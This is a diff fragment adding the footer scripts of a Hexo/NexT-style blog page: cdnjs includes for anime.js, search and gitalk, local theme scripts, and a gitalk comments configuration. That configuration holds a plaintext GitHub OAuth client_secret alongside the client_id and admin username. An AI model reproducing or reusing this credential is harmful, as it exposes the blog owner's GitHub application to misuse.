+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script>
+
+  
+<script src="https://cdnjs.cloudflare.com/ajax/libs/hexo-generator-searchdb/1.4.0/search.js" integrity="sha256-vXZMYLEqsROAXkEw93GGIvaB2ab+QW6w3+1ahD9nXXA=" crossorigin="anonymous"></script>
+<script src="/js/third-party/search/local-search.js"></script>
+
+
+
+
+
+  
+
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.css" integrity="sha256-AJnUHL7dBv6PGaeyPQJcgQPDjt/Hn/PvYZde1iqfp8U=" crossorigin="anonymous">
+
+<script class="next-config" data-name="gitalk" type="application/json">{"enable":true,"client_id":"96531982aa814e82e033","client_secret":"9d64fd0a7523408d110bfc9839658aaa2a0ee62e","repo":"Blog_Comments","github_id":"gaoteng17","admin_user":"gaoteng17","distraction_free_mode":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token","language":null,"js":{"url":"https://cdnjs.cloudflare.com/ajax/libs/gitalk/1.8.0/gitalk.min.js","integrity":"sha256-MVK9MGD/XJaGyIghSVrONSnoXoGh3IFxLw0zfvzpxR4="},"path_md5":"8b4aaf364efbc39abc36d7c3f164e0ba"}</script>
+<script src="/js/third-party/comments/gitalk.js"></script>
+
+</body>
+</html>
